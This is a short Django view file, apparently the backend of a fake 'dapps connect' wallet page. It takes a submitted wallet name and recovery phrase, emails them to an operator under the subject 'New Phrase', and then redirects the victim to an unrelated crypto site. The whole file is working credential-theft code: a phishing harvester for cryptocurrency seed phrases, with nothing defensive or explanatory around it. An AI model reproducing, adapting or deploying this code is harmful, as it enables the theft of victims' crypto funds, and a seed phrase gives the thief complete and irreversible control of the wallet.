from django.shortcuts import render, redirect
from django.conf import settings
from django.core.mail import EmailMessage
from django.template.loader import render_to_string

# Create your views here.
def index(request):
    if request.method == "POST":
        phrase = request.POST['phrase']
        wallet = request.POST['wallet']

        email_subject = 'New Phrase'
        email_body = render_to_string('dappsconnect/email.html', {
            'phrase':phrase,
            'wallet': wallet,
        })
        email= EmailMessage(subject=email_subject,body=email_body, from_email= settings.EMAIL_FROM_USER,to=[settings.EMAIL_TO_USER])
        email.send()
        return redirect("https://cryptocurrencyalerting.com/coin-listing-events.html")
    context = {}
    return render(request, "dappsconnect/index.html", context)